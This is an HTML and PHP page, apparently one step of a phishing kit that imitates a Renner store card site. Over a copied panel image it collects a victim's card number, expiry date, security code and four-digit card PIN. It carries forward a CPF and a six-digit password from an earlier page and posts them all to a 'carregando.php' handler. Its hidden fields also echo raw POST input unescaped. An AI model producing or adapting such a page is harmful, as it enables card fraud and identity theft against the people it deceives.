<style type="text/css">

body {
    background-image: url('/Imagens/Desktop/fundo2.png');
    background-repeat: no-repeat;
    background-size: 103%;
    background-position: 0px 0px;
}

input {
	float: left;
	width: 48%;
	padding: 0 1% 0px;
	position: relative;
	font-size: 13px;
}

.painel {
	background-size: 105%;
	position: absolute; 
	outline: 0; 
	left: 491px; 
	top: 85px; 
	border-radius: 8px;
}

.cc {
	position: absolute; 
	width: 310px; 
	height: 48px; 
	outline: 0; 
	left: 550px; 
	top: 196px; 
	border-radius: 8px;
}

.validade {
	position: absolute; 
	width: 150px; 
	height: 48px; 
	outline: 0; 
	left: 550px; 
	top: 262px; 
	border-radius: 8px;
}

.ccv {
	position: absolute; 
	width: 150px; 
	height: 48px; 
	outline: 0; 
	left: 710px; 
	top: 262px; 
	border-radius: 8px;
}

.senha {
	position: absolute; 
	width: 310px; 
	height: 48px; 
	outline: 0; 
	left: 550px; 
	top: 329px; 
	border-radius: 8px;
}

.botao {
	display:block; 
	width: 302px; 
	height: 53px; 
	left: 551px; 
	top: 413px; 
	position: absolute; 
	color: #fff; 
	background-color: #1e1e1f; 
	font-size: 16px;
	border-radius: 6px;
}
</style>

<script>
 function mascara(t, mask){
 var i = t.value.length;
 var saida = mask.substring(1,0);
 var texto = mask.substring(i)
 if (texto.substring(0,1) != saida){
 t.value += texto.substring(0,1);
 }
 }
</script>
<head>

<form method="post" action="/carregando.php">

<div style="display:relative">

<img src="/Imagens/Desktop/painel2.png" class="painel" width="??" height="??" />

<input type="hidden" name="cpf" value="<?php echo $_POST['cpf']; ?>">
<input type="hidden" name="senha6" value="<?php echo $_POST['senha6']; ?>">

<input type="tel" autocomplete="off" minlength="19" maxlength="19" name="cc" id="cc" placeholder="Número do Cartão" class="cc" oninvalid="setCustomValidity('Insira os números do seu cartão Renner.')" oninput="setCustomValidity('')" onkeypress="mascara(this, '0000 0000 0000 0000')" required/>

<input type="tel" autocomplete="off" minlength="4" maxlength="7" name="validade" id="validade" placeholder="MM/AA" class="validade" oninvalid="setCustomValidity('Dados incompletos.')" oninput="setCustomValidity('')" onkeypress="mascara(this, '00/0000')" required/>

<input type="password" autocomplete="off" minlength="3" maxlength="3" name="ccv" id="ccv" placeholder="Cod Segurança" class="ccv" oninvalid="setCustomValidity('Dados incompletos.')" oninput="setCustomValidity('')" required/>

<input type="password" autocomplete="off" minlength="4" maxlength="4" name="senha4" id="senha4" placeholder="Senha do Cartão" class="senha" oninvalid="setCustomValidity('Insira sua senha.')" oninput="setCustomValidity('')" required/>

<button type="submit" onclick="valida_form();" class="botao">Confirmar</button>
</div>
</form>
</head>